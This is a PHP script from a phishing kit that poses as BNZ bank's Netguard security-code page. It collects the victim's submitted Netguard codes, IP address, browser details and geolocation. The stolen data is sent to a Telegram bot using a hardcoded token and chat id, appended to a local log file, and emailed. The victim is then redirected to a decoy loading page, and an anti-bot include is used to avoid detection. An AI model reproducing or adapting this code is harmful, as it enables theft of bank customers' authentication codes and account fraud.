<?php

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}
session_start();
include 'antibots.php';
$agent=$_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g:i a");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$hostname = gethostbyaddr($ip);
$message  = "==================+[ BNZ Netguard ]+==================\n";
$message .= "Netguard: ".$_POST['cod1']." ".$_POST['cod2']." ".$_POST['cod3']."\n";
$message .= "IP: ".$ip."\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "DateTime: ".$timedate."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "---------------Created By WeStGiRl-----------------\n";
function message($message) {    
$token = "6448925170:AAE45hL1mgE9oqIIflBIAG6TgplesTMJ6lc";  // set here your TOKEN value             
 $url='https://api.telegram.org/bot'.$token.'/sendMessage';
 $data=array('chat_id'=>-924980373,'text'=>$message);                                         
 $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);                                             
 $context=stream_context_create($options);        
 $result=file_get_contents($url,false,$context);        
 return $result; 
} 

message($message); 
    $text = fopen('westgirl.txt', 'a');
fwrite($text, $message);
mail("$send", "$subject", $message);

header("Location: loading-4.php?&".generateRandomString(200));

?>	  